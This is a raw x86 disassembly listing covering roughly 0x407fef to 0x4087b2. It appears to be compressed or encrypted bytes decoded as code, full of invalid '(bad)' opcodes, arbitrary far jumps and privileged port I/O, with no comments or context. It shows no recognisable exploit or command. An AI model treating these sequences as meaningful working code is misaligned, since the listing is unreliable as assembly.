  407fef:	pushf  
  407ff0:	dec    DWORD PTR [eax-0x1f]
  407ff3:	stos   DWORD PTR es:[edi],eax
  407ff4:	sbb    al,BYTE PTR cs:[edx+0x6d]
  407ff8:	push   ds
  407ff9:	sub    BYTE PTR [ebx-0x2a0cc2f5],dl
  407fff:	mov    bl,0x42
  408001:	inc    ebp
  408002:	dec    ecx
  408003:	lods   eax,DWORD PTR ds:[esi]
  408004:	gs aas 
  408006:	pushf  
  408007:	sbb    edi,edi
  408009:	mov    ah,BYTE PTR [eax]
  40800b:	dec    edi
  40800c:	sub    BYTE PTR [ebx+0x49],bl
  40800f:	adc    BYTE PTR [eax+esi*8+0x7e249156],ah
  408016:	dec    ebp
  408017:	jmp    0x1ded6a54
  40801c:	adc    BYTE PTR [esi],bl
  40801e:	xor    ebx,DWORD PTR [edi]
  408020:	cmp    BYTE PTR [ebx+0x6e],ah
  408023:	dec    ecx
  408024:	outs   dx,BYTE PTR ds:[esi]
  408025:	sub    bl,BYTE PTR [ebx+0x1]
  408028:	cmp    BYTE PTR [ecx],al
  40802a:	jae    0x407fef
  40802c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40802d:	sbb    al,0x1b
  40802f:	(bad)  
  408030:	cwde   
  408031:	inc    eax
  408032:	ins    BYTE PTR es:[edi],dx
  408033:	das    
  408034:	imul   ecx,ebx,0x22fd156e
  40803a:	or     al,BYTE PTR [eax+0x5c9e9fe5]
  408040:	int3   
  408041:	mov    dh,ch
  408043:	fs push cs
  408045:	sub    al,0xda
  408047:	adc    eax,DWORD PTR [ecx]
  408049:	and    eax,0x3789191a
  40804e:	xor    DWORD PTR [ebx],esi
  408050:	loopne 0x408045
  408052:	jbe    0x408097
  408054:	mov    ds:0x9911f7eb,eax
  408059:	sub    DWORD PTR [ebp+0x37],edx
  40805c:	xlat   BYTE PTR ds:[ebx]
  40805d:	adc    al,0xfd
  40805f:	lods   eax,DWORD PTR ds:[esi]
  408060:	cmp    al,0x73
  408062:	and    ebp,DWORD PTR [edx+0x7a]
  408065:	mov    dx,0x4f24
  408069:	call   0xdd08:0x525331b9
  408070:	fbld   TBYTE PTR cs:[esi+0x15]
  408074:	and    DWORD PTR [esi-0x5b],edx
  408077:	xchg   DWORD PTR [ebx+0x1cc3a152],esi
  40807d:	das    
  40807e:	retf   0x3157
  408081:	outs   dx,DWORD PTR ds:[esi]
  408082:	adc    DWORD PTR ds:[ebp+ebp*4+0x65],esi
  408087:	mov    cl,0x8a
  408089:	retf   
  40808a:	pop    ds
  40808b:	mov    esp,DWORD PTR ds:0x975a4417
  408091:	scas   eax,DWORD PTR es:[edi]
  408092:	xchg   DWORD PTR [esi],eax
  408094:	add    ah,BYTE PTR [ebx-0xd]
  408097:	push   ss
  408098:	jno    0x408032
  40809a:	pop    ss
  40809b:	xchg   edi,eax
  40809c:	jb     0x4080a2
  40809e:	es jmp 0xc2a297fc
  4080a4:	xor    ch,BYTE PTR [ebp*8+0x66b60a4]
  4080ab:	cmp    ebx,edx
  4080ad:	test   bh,al
  4080af:	dec    ebx
  4080b0:	sub    BYTE PTR [ecx-0x4eb4dd8c],cl
  4080b6:	ds or  cl,dh
  4080b9:	push   0x8db692e2
  4080be:	aas    
  4080bf:	jae    0x4080d3
  4080c1:	add    bl,bl
  4080c3:	in     al,0xe7
  4080c5:	or     BYTE PTR [edx-0x6d],0xb3
  4080c9:	rol    BYTE PTR ds:0xeac35acb,1
  4080cf:	and    BYTE PTR [ecx],dh
  4080d1:	mov    eax,0x619efab5
  4080d6:	aaa    
  4080d7:	enter  0x1a75,0xf6
  4080db:	adc    BYTE PTR [eax-0x13b5398a],dh
  4080e1:	or     al,0x4a
  4080e3:	sti    
  4080e4:	pop    ds
  4080e5:	sbb    al,bh
  4080e7:	aaa    
  4080e8:	loope  0x408137
  4080ea:	test   DWORD PTR [edx],edx
  4080ec:	pop    eax
  4080ed:	(bad)  
  4080ef:	cmp    eax,0x7d44b469
  4080f4:	xor    al,0xac
  4080f6:	xchg   esi,eax
  4080f7:	or     al,0x1f
  4080f9:	fsin   
  4080fb:	xor    BYTE PTR [edx],bl
  4080fd:	cmp    BYTE PTR [eax+0x6a116fd0],bl
  408103:	add    esi,DWORD PTR [ebp-0x44d55a1f]
  408109:	js     0x40813c
  40810b:	xor    al,BYTE PTR [ebx]
  40810d:	cmp    BYTE PTR [edi+ebx*4-0x23898e6d],0xb8
  408115:	pop    ss
  408116:	loop   0x40814f
  408118:	sub    dh,dh
  40811a:	sbb    ch,BYTE PTR [ebx+0x2a]
  40811d:	push   ebp
  40811e:	jg     0x408108
  408120:	mov    eax,0x2750e4bf
  408125:	pop    ebx
  408126:	mov    WORD PTR [esi-0x6f],cs
  408129:	add    DWORD PTR [ecx],ebp
  40812b:	iret   
  40812c:	push   0x52abe97b
  408131:	or     al,0x93
  408133:	sub    al,0xc0
  408135:	ins    DWORD PTR es:[edi],dx
  408136:	pushf  
  408137:	inc    ecx
  408138:	inc    esp
  408139:	pop    eax
  40813a:	rcr    DWORD PTR [ebx],0xf4
  40813d:	dec    edx
  40813e:	fisub  DWORD PTR [esi]
  408140:	push   0x65
  408142:	retf   
  408143:	loopne 0x4081c2
  408145:	out    dx,al
  408146:	xchg   edi,eax
  408147:	sbb    al,0x76
  408149:	(bad)  
  40814b:	pop    edx
  40814c:	ret    0x1cb3
  40814f:	xchg   DWORD PTR [esi],edx
  408151:	mov    eax,ds:0x5aec301b
  408156:	pusha  
  408157:	dec    ebx
  408158:	mov    eax,0xa9899293
  40815d:	inc    ebp
  40815e:	xor    BYTE PTR [ebx],ah
  408160:	inc    esi
  408161:	arpl   WORD PTR [eax],dx
  408163:	(bad)  
  408164:	lahf   
  408165:	inc    esp
  408166:	dec    eax
  408167:	loope  0x40817e
  408169:	push   edx
  40816a:	fwait
  40816b:	mov    eax,0xdd49e388
  408170:	popf   
  408171:	inc    eax
  408172:	out    0x9f,eax
  408174:	xchg   esp,eax
  408175:	add    BYTE PTR gs:[eax+0x7c787528],0x3b
  40817d:	fmul   DWORD PTR [edx]
  40817f:	leave  
  408180:	inc    esi
  408181:	dec    ebp
  408182:	jae    0x40811a
  408184:	push   ecx
  408185:	add    al,0x15
  408187:	mov    dh,0x9b
  408189:	gs and bl,bl
  40818c:	imul   esi
  40818e:	sar    BYTE PTR [bx+si-0x16a5],1
  408193:	lock mov DWORD PTR [ebp+0x1927b5d2],edx
  40819a:	mov    esp,0xd1136284
  40819f:	ds dec esi
  4081a2:	ss inc ecx
  4081a4:	sahf   
  4081a5:	jae    0x4081e1
  4081a7:	push   ecx
  4081a8:	pop    eax
  4081a9:	dec    eax
  4081aa:	jb     0x40814e
  4081ac:	jge    0x4081ca
  4081ae:	popa   
  4081af:	push   0x50
  4081b1:	in     eax,0x31
  4081b3:	dec    ebx
  4081b4:	or     al,0x3d
  4081b6:	sar    dh,0xee
  4081b9:	lahf   
  4081ba:	pop    ebp
  4081bb:	icebp  
  4081bc:	push   edi
  4081bd:	sub    al,0x6c
  4081bf:	xchg   edx,eax
  4081c0:	stos   BYTE PTR es:[edi],al
  4081c1:	xchg   ecx,edi
  4081c3:	adc    al,0x6c
  4081c5:	test   BYTE PTR [esi-0x6b],0xfb
  4081c9:	pop    ds
  4081ca:	(bad)  
  4081cb:	stc    
  4081cc:	xor    al,0xe9
  4081ce:	fdivr  DWORD PTR [eax-0x10]
  4081d1:	clc    
  4081d2:	pushf  
  4081d3:	cmc    
  4081d4:	mov    cs,WORD PTR [edi]
  4081d6:	pop    eax
  4081d7:	push   ss
  4081d8:	inc    BYTE PTR ds:0xa535a5ba
  4081de:	adc    BYTE PTR [edi+0x4c],bl
  4081e1:	ins    BYTE PTR es:[edi],dx
  4081e2:	stos   BYTE PTR es:[edi],al
  4081e3:	mov    al,ds:0x5cc08984
  4081e8:	jle    0x408178
  4081ea:	rol    BYTE PTR [ecx+0x39628aa0],0x4c
  4081f1:	push   eax
  4081f2:	(bad)  [esi-0x6a2ff9c]
  4081f8:	mov    BYTE PTR [edx+0x59a676c0],ah
  4081fe:	dec    esp
  4081ff:	out    0x6,eax
  408201:	dec    edx
  408202:	mov    ecx,0x3d047b0d
  408207:	fcom   QWORD PTR [ebp+0x6da320f8]
  40820d:	imul   esp,DWORD PTR [ebx],0x49
  408210:	out    0x8e,al
  408212:	pop    ebx
  408213:	test   BYTE PTR [eax],cl
  408215:	jl     0x408242
  408217:	add    al,BYTE PTR [edi+0x46]
  40821a:	push   0xcbcc8614
  40821f:	neg    DWORD PTR [edx-0x65ed24ae]
  408225:	imul   ecx,DWORD PTR [edi-0x6acaf8ba],0x41
  40822c:	sub    al,0xa2
  40822e:	lods   al,BYTE PTR ds:[esi]
  40822f:	sbb    BYTE PTR [edx-0xc],bl
  408232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408233:	loope  0x40825e
  408235:	sub    eax,0x33b8e0bc
  40823a:	shl    BYTE PTR [eax],cl
  40823c:	sti    
  40823d:	sbb    edx,DWORD PTR [edi+esi*2]
  408240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408241:	dec    ebx
  408242:	inc    ecx
  408243:	adc    bh,al
  408245:	xor    BYTE PTR [ebx+0x6138dc4a],dl
  40824b:	sub    eax,0x6b4d9115
  408250:	jmp    0x4082a2
  408252:	cmp    DWORD PTR [esp+ebp*2-0x35],0x7d023b7
  40825a:	adc    al,0x8f
  40825c:	adc    esi,ecx
  40825e:	test   eax,0x8b26aedb
  408263:	ss (bad) 
  408265:	loop   0x4082dd
  408267:	daa    
  408268:	mov    ds:0xa3215dda,eax
  40826d:	cmc    
  40826e:	(bad)  
  40826f:	mov    ds:0x57b24b17,eax
  408274:	pusha  
  408275:	mov    eax,ds:0x93f9c39f
  40827a:	popa   
  40827b:	scas   eax,DWORD PTR es:[edi]
  40827c:	mov    esi,0x9e5eaff8
  408281:	xchg   edi,eax
  408282:	xchg   edx,eax
  408283:	xchg   ebp,eax
  408284:	loopne 0x408270
  408286:	pop    ebp
  408287:	pushf  
  408288:	(bad)
  40828c:	sbb    al,0x95
  40828e:	and    al,0x8
  408290:	sub    ecx,DWORD PTR [ebp+0x42]
  408293:	or     eax,0x602e12c4
  408298:	lock adc al,0x49
  40829b:	inc    edi
  40829c:	inc    edx
  40829d:	inc    esp
  40829e:	dec    edx
  40829f:	push   ecx
  4082a0:	dec    esi
  4082a1:	popf   
  4082a2:	xchg   esp,eax
  4082a3:	(bad)  
  4082a4:	push   eax
  4082a5:	sub    BYTE PTR [ebp-0x14996bb0],bl
  4082ab:	jno    0x408237
  4082ad:	mov    dl,0x2b
  4082af:	ret    0xc7f5
  4082b2:	repnz clc 
  4082b4:	pop    ds
  4082b5:	add    bl,dh
  4082b7:	inc    ebp
  4082b8:	xor    BYTE PTR [edx],dh
  4082ba:	or     al,0x80
  4082bc:	mov    ecx,0x827a98a9
  4082c1:	mov    BYTE PTR [esi-0x78],dh
  4082c4:	sar    DWORD PTR [ecx-0x1b93bf41],cl
  4082ca:	out    dx,eax
  4082cb:	mov    eax,ds:0xff973e41
  4082d0:	fwait
  4082d1:	shl    edi,0xf5
  4082d4:	xor    al,0xfa
  4082d6:	sub    al,BYTE PTR [eax+ebx*4-0x55]
  4082da:	push   0x4
  4082dc:	std    
  4082dd:	in     eax,dx
  4082de:	xor    DWORD PTR [ebp+0x7109d685],esi
  4082e4:	push   ebp
  4082e5:	pusha  
  4082e6:	lods   eax,DWORD PTR ds:[esi]
  4082e7:	shr    DWORD PTR [ebx+0x20],0x28
  4082eb:	mov    al,ds:0x64428c6
  4082f0:	mov    eax,0x2e3057e7
  4082f5:	pop    es
  4082f6:	or     bh,BYTE PTR [ebx-0x7c]
  4082f9:	addr16 js 0x408305
  4082fc:	fldcw  WORD PTR [edi-0x5f1cbb3d]
  408302:	neg    BYTE PTR [edx+edi*1-0x6d]
  408306:	shl    bh,0x8f
  408309:	jno    0x4082f6
  40830b:	lods   al,BYTE PTR ds:[esi]
  40830c:	sub    al,0xaf
  40830e:	jl     0x408315
  408310:	xchg   ecx,eax
  408311:	jne    0x4082d6
  408313:	aad    0xae
  408315:	xchg   edx,eax
  408316:	test   eax,0xfe8af936
  40831b:	xchg   ebp,eax
  40831c:	xor    ecx,0x749e0c1
  408322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408323:	repz cmp al,0x91
  408326:	in     al,dx
  408327:	clc    
  408328:	icebp  
  408329:	call   0x727e9e38
  40832e:	sub    eax,0xb313b86
  408333:	push   ecx
  408334:	adc    eax,0x66f8a302
  408339:	or     eax,0x2202b7f2
  40833e:	mov    WORD PTR [edi+ecx*8+0x754cfb70],?
  408345:	cmp    ebp,ecx
  408347:	cmp    eax,0xcf5ec0dc
  40834c:	pop    ebp
  40834d:	pop    ecx
  40834e:	xchg   esp,eax
  40834f:	std    
  408350:	pop    edi
  408351:	(bad)  
  408352:	and    ah,ah
  408354:	les    eax,FWORD PTR [edx-0x38]
  408357:	inc    edx
  408358:	cmp    DWORD PTR [esi-0x30],0xe65d9564
  40835f:	push   0x2201e09d
  408364:	push   0x5c
  408366:	sbb    BYTE PTR [ecx+0x4d],dh
  408369:	cmp    DWORD PTR [eax],ebp
  40836b:	ins    BYTE PTR es:[edi],dx
  40836c:	or     ch,BYTE PTR [edx-0x7d31216a]
  408372:	xchg   edx,eax
  408373:	repz xor edx,DWORD PTR [edx+0x4375c5d1]
  40837a:	(bad)  
  40837b:	mov    ecx,0x26d2644b
  408380:	pop    ebx
  408381:	adc    al,0xe
  408383:	sub    BYTE PTR [ebp-0x4d5651f5],dl
  408389:	aas    
  40838a:	arpl   WORD PTR [ebx-0x40339631],cx
  408390:	retf   0xfebb
  408393:	mov    dl,0x63
  408395:	xor    eax,eax
  408397:	add    BYTE PTR [edx+0x21],0x77
  40839b:	ins    DWORD PTR es:[edi],dx
  40839c:	inc    DWORD PTR [ecx-0x64]
  40839f:	mov    dh,0x59
  4083a1:	dec    ebp
  4083a2:	fstp   DWORD PTR [ecx+ebx*2]
  4083a5:	push   ebp
  4083a6:	iret   
  4083a7:	sbb    DWORD PTR [ecx-0x4c59dce1],esp
  4083ad:	adc    BYTE PTR [ebx+0x7c],ch
  4083b0:	xchg   esp,eax
  4083b1:	dec    esp
  4083b2:	inc    edi
  4083b3:	add    al,0xcb
  4083b5:	idiv   DWORD PTR [esi]
  4083b7:	sub    esi,DWORD PTR [ebx+0x48]
  4083ba:	dec    esp
  4083bb:	cmp    bh,BYTE PTR [ecx+0x1ce11e49]
  4083c1:	adc    DWORD PTR [eax],edx
  4083c3:	mov    eax,0x66a92b14
  4083c8:	mov    dh,0x11
  4083ca:	add    al,0x84
  4083cc:	stc    
  4083cd:	addr16 (bad) 
  4083cf:	and    eax,0xc4323c7
  4083d4:	dec    eax
  4083d5:	in     eax,dx
  4083d6:	sbb    al,0xdb
  4083d8:	sub    ch,0x7c
  4083db:	nop
  4083dc:	fisubr WORD PTR [eax+eax*8+0x3c9a06f7]
  4083e3:	xlat   BYTE PTR ds:[ebx]
  4083e4:	pop    esp
  4083e5:	sub    ch,BYTE PTR [eax]
  4083e7:	sbb    bh,BYTE PTR [esp+edx*1+0x32]
  4083eb:	mov    ecx,0x7bf4047c
  4083f0:	bswap  eax
  4083f2:	fadd   QWORD PTR [ecx+0x7a3bf3a2]
  4083f8:	adc    DWORD PTR [ecx],ecx
  4083fa:	and    eax,0xa51068b1
  4083ff:	mov    eax,ds:0x8ca0f7ae
  408404:	(bad)  
  408405:	in     eax,0xdd
  408407:	retf   0x155c
  40840a:	mov    al,ds:0x895b7135
  40840f:	push   0x8f51e029
  408414:	add    esp,ebp
  408416:	mov    BYTE PTR [ecx],al
  408418:	xor    edi,DWORD PTR [esi]
  40841a:	mov    esp,DWORD PTR [ebx]
  40841c:	xchg   esi,eax
  40841d:	pop    ecx
  40841e:	or     DWORD PTR [ebp+0x71a0791f],ebp
  408424:	rcl    BYTE PTR [ecx+eiz*4-0x583445a1],1
  40842b:	sub    BYTE PTR [ebx+0x5c4842af],al
  408431:	test   DWORD PTR [ebx],eax
  408433:	sbb    esi,DWORD PTR [eax-0x1165a3e6]
  408439:	fidivr DWORD PTR [esi]
  40843b:	jecxz  0x40845a
  40843d:	xor    esi,DWORD PTR [edi]
  40843f:	push   ds
  408440:	inc    edx
  408441:	inc    edx
  408442:	ss sahf 
  408444:	push   0x6
  408446:	lahf   
  408447:	fsub   DWORD PTR [ecx-0x5480452c]
  40844d:	pop    esi
  40844e:	test   BYTE PTR [ecx+0x475c6f5a],bh
  408454:	mov    bl,0xd0
  408456:	clc    
  408457:	ss leave 
  408459:	add    eax,DWORD PTR [ecx+0x79a0971e]
  40845f:	adc    al,0xf7
  408461:	mov    dl,0x5a
  408463:	outs   dx,DWORD PTR ds:[esi]
  408464:	xchg   ecx,eax
  408465:	out    dx,eax
  408466:	in     al,0xd5
  408468:	sbb    BYTE PTR [esp+eax*4+0x2a],ah
  40846c:	push   ebp
  40846d:	add    DWORD PTR ds:0x4768011b,ecx
  408473:	dec    edi
  408474:	push   esi
  408475:	xchg   DWORD PTR [eax],edx
  408477:	pop    ebp
  408478:	xor    BYTE PTR [ecx*1+0xe7701fb],dh
  40847f:	repnz test BYTE PTR [ecx+0x4a],ch
  408483:	adc    DWORD PTR [eax+0x47],esi
  408486:	cmp    BYTE PTR [ebx-0xc015a89],bl
  40848c:	das    
  40848d:	push   esi
  40848e:	mov    al,ds:0xe2463320
  408493:	jae    0x408450
  408495:	out    dx,al
  408496:	jb     0x40842c
  408498:	ret    
  408499:	dec    esp
  40849a:	fs mov dh,0x7d
  40849d:	push   esi
  40849e:	pop    ebx
  40849f:	arpl   WORD PTR [ecx-0x5],dx
  4084a2:	sbb    BYTE PTR [ecx],cl
  4084a4:	retf   0x429d
  4084a7:	mov    BYTE PTR [ecx-0x713719fe],cl
  4084ad:	mov    ch,0xa9
  4084af:	lods   eax,DWORD PTR ds:[esi]
  4084b0:	gs xor ebx,esp
  4084b3:	add    DWORD PTR [ebx+ebx*4],eax
  4084b6:	lahf   
  4084b7:	ins    DWORD PTR es:[edi],dx
  4084b8:	and    DWORD PTR [esi],ebp
  4084ba:	shr    DWORD PTR [ecx],1
  4084bc:	add    DWORD PTR [eax-0x52ab3967],esp
  4084c2:	mov    ds,WORD PTR [ebx]
  4084c4:	push   ecx
  4084c5:	or     dh,bh
  4084c7:	(bad)  
  4084c8:	jo     0x408511
  4084ca:	dec    eax
  4084cb:	js     0x4084d2
  4084cd:	ins    BYTE PTR es:[edi],dx
  4084ce:	sti    
  4084cf:	js     0x4084ce
  4084d1:	jne    0x4084ac
  4084d3:	ins    BYTE PTR es:[edi],dx
  4084d4:	rcl    esi,1
  4084d6:	aas    
  4084d7:	into   
  4084d8:	sti    
  4084d9:	pop    es
  4084da:	jecxz  0x4084a2
  4084dc:	jae    0x40855b
  4084de:	mov    cl,0x13
  4084e0:	sub    ecx,esi
  4084e2:	std    
  4084e3:	stc    
  4084e4:	xchg   DWORD PTR [eax+0x44],edi
  4084e7:	xor    eax,0x6f72ebcf
  4084ec:	cmp    DWORD PTR [eax-0x7d],esp
  4084ef:	inc    ebp
  4084f0:	push   ds
  4084f1:	dec    esi
  4084f2:	std    
  4084f3:	mov    esi,0xfd7dc6da
  4084f8:	sahf   
  4084f9:	rol    BYTE PTR [ebp-0x76a0b0b2],1
  4084ff:	sub    ch,BYTE PTR [edx+edx*8]
  408502:	out    0xb3,al
  408504:	mov    dh,0x36
  408506:	(bad)  
  408507:	clc    
  408508:	jnp    0x4084c7
  40850a:	lods   al,BYTE PTR ds:[esi]
  40850b:	sbb    DWORD PTR [ebx+0x3a],0x6ec73321
  408512:	hlt    
  408513:	mov    cl,0x9c
  408515:	xor    bl,BYTE PTR [ecx]
  408517:	cmovno eax,DWORD PTR [eax-0x3e]
  40851b:	(bad)  
  40851c:	dec    ecx
  40851d:	in     eax,0xa3
  40851f:	ss pop ebp
  408521:	outs   dx,BYTE PTR ds:[esi]
  408522:	cs mov al,0xed
  408525:	aad    0x7
  408527:	sbb    al,BYTE PTR [edx]
  408529:	mov    ah,0xaf
  40852b:	sbb    esp,DWORD PTR [ebx+0x5b]
  40852e:	mov    cl,0x5
  408530:	sbb    ch,BYTE PTR [ebp+0x15]
  408533:	sbb    bh,BYTE PTR [esi]
  408535:	loopne 0x408503
  408537:	cmp    BYTE PTR [edi+0x44],ah
  40853a:	sar    dh,cl
  40853c:	aaa    
  40853d:	push   ebx
  40853e:	dec    ebx
  40853f:	mov    edx,0xf4a6931c
  408544:	or     eax,0xd203cb24
  408549:	cdq    
  40854a:	jnp    0x408586
  40854c:	add    edx,DWORD PTR [edx]
  40854e:	xchg   ebp,eax
  40854f:	dec    esp
  408550:	push   ebx
  408551:	push   es
  408552:	mov    edi,0x6b87820a
  408557:	sbb    DWORD PTR [edi+0x674526e5],eax
  40855d:	in     al,dx
  40855e:	adc    eax,0x4838d5a5
  408563:	les    ebp,FWORD PTR [edx]
  408565:	(bad)  
  408566:	lea    edx,ss:[ecx+0x70]
  40856a:	fld    TBYTE PTR [ecx+esi*4]
  40856d:	ror    BYTE PTR fs:[ebx+0x5e],1
  408571:	inc    ebx
  408572:	je     0x4085ee
  408574:	jmp    0x1fc4b735
  408579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40857a:	xor    DWORD PTR [edx-0x75],ecx
  40857d:	repnz push edi
  40857f:	pushf  
  408580:	cs jecxz 0x4085d2
  408583:	cwde   
  408584:	add    DWORD PTR [ebx-0x3b],edx
  408587:	ret    0x9005
  40858a:	test   DWORD PTR [ebp+0x6f],ecx
  40858d:	jecxz  0x40857b
  40858f:	adc    dl,BYTE PTR [ebp+0xe9ceee6]
  408595:	adc    eax,0xb13aee3
  40859a:	add    al,BYTE PTR [edx+0x29901ede]
  4085a0:	scas   al,BYTE PTR es:[edi]
  4085a1:	aaa    
  4085a2:	pop    ecx
  4085a3:	xor    BYTE PTR [edx],ah
  4085a5:	in     eax,dx
  4085a6:	jns    0x4085e7
  4085a8:	jge    0x408579
  4085aa:	cmp    BYTE PTR [ecx-0x1fbb68a7],ah
  4085b0:	push   ds
  4085b1:	cwde   
  4085b2:	inc    esp
  4085b3:	jp     0x40856f
  4085b5:	loopne 0x408609
  4085b7:	call   0xfd39:0x7b09a373
  4085be:	cmp    BYTE PTR [edi-0x65],0xb2
  4085c2:	sbb    al,0xd1
  4085c4:	xor    eax,0xf63a0422
  4085c9:	pop    ds
  4085ca:	arpl   WORD PTR [edx+0x313bae8d],di
  4085d0:	xchg   ebp,eax
  4085d1:	push   ecx
  4085d2:	adc    dl,al
  4085d4:	push   cs
  4085d5:	inc    edx
  4085d6:	mov    ds:0xf445c7eb,al
  4085db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085dc:	test   DWORD PTR [eax+edi*8-0x1603ba75],ebx
  4085e3:	stos   BYTE PTR es:[edi],al
  4085e4:	and    eax,DWORD PTR [eax]
  4085e6:	add    BYTE PTR ds:0x84488431,bl
  4085ec:	les    ebx,FWORD PTR [ebp+0xc292524]
  4085f2:	push   0xffffffe7
  4085f4:	xchg   edx,eax
  4085f5:	hlt    
  4085f6:	cmp    BYTE PTR [ecx+0x19],0x83
  4085fa:	xor    ecx,0x60
  4085fd:	add    DWORD PTR [ebx-0x7f70bf45],0x71
  408604:	mov    ch,0xe
  408606:	xchg   DWORD PTR [eax+ebx*4+0x341b5e0b],edi
  40860d:	sbb    al,0x39
  40860f:	adc    cl,dl
  408611:	bsr    ecx,DWORD PTR [ecx+0x27]
  408615:	xchg   edi,eax
  408616:	cs or  eax,0xf4b2e8db
  40861c:	sub    ecx,DWORD PTR [edx-0x49]
  40861f:	jo     0x40867e
  408621:	pop    ds
  408622:	inc    ebx
  408623:	jmp    0x8aac:0xcc75fd81
  40862a:	sbb    DWORD PTR [ecx-0x2d35c164],0xb7a05686
  408634:	dec    esi
  408635:	xor    eax,0x88aa930a
  40863a:	cmp    dh,BYTE PTR [ebx-0x36816a15]
  408640:	mov    edx,0xdb86b6b2
  408645:	mov    edx,DWORD PTR [edx-0xa714c3a]
  40864b:	sbb    eax,0x4c402088
  408650:	inc    ebp
  408651:	repnz cwde 
  408653:	sbb    eax,0x88274d8
  408658:	sub    eax,0x44b5c19f
  40865d:	sbb    DWORD PTR [esi+0x46],ecx
  408660:	(bad)  
  408662:	fadd   QWORD PTR [edx+0xc8b0cca]
  408668:	and    al,0x9d
  40866a:	rcl    BYTE PTR [esi+0x43efff20],cl
  408670:	aad    0xb8
  408672:	xor    al,0x46
  408674:	aaa    
  408675:	pop    ebx
  408676:	ins    DWORD PTR es:[edi],dx
  408677:	les    esp,FWORD PTR [esi+0x57]
  40867a:	cwde   
  40867b:	sub    dl,BYTE PTR [eax-0x20]
  40867e:	jae    0x4086ce
  408680:	adc    DWORD PTR [esi-0x4e],0xa02951ea
  408687:	mov    DWORD PTR [ebx-0x13],ebp
  40868a:	mov    ds:0x86090674,eax
  40868f:	add    al,BYTE PTR [eax]
  408691:	jno    0x408624
  408693:	add    al,0x71
  408695:	xchg   esp,eax
  408696:	ins    DWORD PTR es:[edi],dx
  408697:	jne    0x408714
  408699:	out    dx,eax
  40869a:	and    ebx,eax
  40869c:	xchg   esi,eax
  40869d:	xor    cl,cl
  40869f:	mov    esp,0xe0afcac3
  4086a4:	cwde   
  4086a5:	mov    al,0x4a
  4086a7:	jmp    FWORD PTR [ebx]
  4086a9:	xchg   edx,eax
  4086aa:	push   esp
  4086ab:	and    al,0x85
  4086ad:	test   DWORD PTR [esi+0xd],ecx
  4086b0:	outs   dx,DWORD PTR ds:[esi]
  4086b1:	dec    esi
  4086b2:	(bad)  
  4086b3:	out    dx,eax
  4086b4:	push   eax
  4086b5:	out    0x1,al
  4086b7:	jl     0x4086cd
  4086b9:	push   ebp
  4086ba:	fnstsw WORD PTR [ebx+ebx*8]
  4086bd:	jge    0x408738
  4086bf:	push   cs
  4086c0:	push   0x1f915bc4
  4086c5:	loopne 0x4086e9
  4086c7:	mov    ss,WORD PTR [edx]
  4086c9:	inc    ebp
  4086ca:	jo     0x408714
  4086cc:	(bad)  
  4086cd:	imul   esi,DWORD PTR [edx],0x7e
  4086d0:	(bad)  
  4086d1:	stos   DWORD PTR es:[edi],eax
  4086d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086d3:	cmc    
  4086d4:	mov    ecx,0x2666886a
  4086d9:	ds xchg esp,eax
  4086db:	add    DWORD PTR [ebx+0x571024b3],edi
  4086e1:	inc    ebx
  4086e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086e3:	std    
  4086e4:	loope  0x40868c
  4086e6:	xor    eax,0x30c98177
  4086eb:	outs   dx,DWORD PTR ds:[esi]
  4086ec:	sub    al,bl
  4086ee:	cli    
  4086ef:	xchg   esp,eax
  4086f0:	loope  0x4086ea
  4086f2:	lahf   
  4086f3:	frstor [esi]
  4086f5:	pop    ss
  4086f6:	fdiv   QWORD PTR [ecx+0x3f]
  4086f9:	add    eax,0x767bb0a3
  4086fe:	addr16 jmp 0xc7a1b5d4
  408704:	gs pop ds
  408706:	dec    ebp
  408707:	jbe    0x408710
  408709:	call   FWORD PTR gs:[eax]
  40870c:	fstp   QWORD PTR [esp+ecx*4]
  40870f:	xchg   edi,eax
  408710:	(bad)  
  408711:	int    0x82
  408713:	in     eax,0xdb
  408715:	pop    edx
  408716:	pop    edx
  408717:	pop    esi
  408718:	das    
  408719:	adc    DWORD PTR [ebx-0x71e86a61],ebx
  40871f:	sbb    ecx,DWORD PTR [ebx-0x22]
  408722:	mov    ebx,0x15b05bf3
  408727:	cmp    al,BYTE PTR [ebx-0x44]
  40872a:	mov    eax,0x5c7b5fa5
  40872f:	cmp    DWORD PTR [edx+0x7cc27869],ebp
  408735:	sbb    al,0x16
  408737:	daa    
  408738:	cmp    ebx,0xa19d2a5b
  40873e:	jae    0x4087a8
  408740:	sub    ah,al
  408742:	sbb    DWORD PTR [ebx+eax*4],ecx
  408745:	dec    ebx
  408746:	int    0x1
  408748:	inc    ebx
  408749:	in     al,dx
  40874a:	add    al,0xe5
  40874c:	mov    ah,BYTE PTR [ebp-0x4d]
  40874f:	or     ebx,DWORD PTR [edi+0x4c]
  408752:	xchg   ebp,ecx
  408754:	gs popf 
  408756:	mov    esp,0x3af70aa8
  40875b:	sti    
  40875c:	xchg   ebx,eax
  40875d:	imul   edx,DWORD PTR [edx-0x3afd3c0a],0x7b338e22
  408767:	std    
  408768:	push   edi
  408769:	lahf   
  40876a:	fbld   TBYTE PTR [edx+0x1c]
  40876d:	jne    0x4087be
  40876f:	imul   ebp,DWORD PTR [ecx],0xffffff9d
  408772:	xor    al,0xed
  408774:	or     al,0x91
  408776:	xor    eax,0xe30a7544
  40877b:	jne    0x408727
  40877d:	pop    ss
  40877e:	jmp    0xe7bc:0xb1eb6bfd
  408785:	dec    ecx
  408786:	sub    eax,DWORD PTR [ebp-0x38]
  408789:	loop   0x4087a6
  40878b:	pop    es
  40878c:	push   edx
  40878d:	outs   dx,DWORD PTR ds:[esi]
  40878e:	out    dx,al
  40878f:	dec    ebx
  408790:	cmp    eax,0x296812b0
  408795:	sbb    dl,BYTE PTR [edx-0x19]
  408798:	jg     0x408777
  40879a:	inc    edi
  40879b:	into   
  40879c:	rcl    BYTE PTR [eax],1
  40879e:	push   ebp
  40879f:	or     eax,0x3dfa74d1
  4087a4:	nop
  4087a5:	push   ss
  4087a6:	xor    al,al
  4087a8:	and    ch,BYTE PTR [eax-0x7b]
  4087ab:	imul   ecx,DWORD PTR [ebx+0x1b],0x558bad14
  4087b2:	xchg   edi,eax
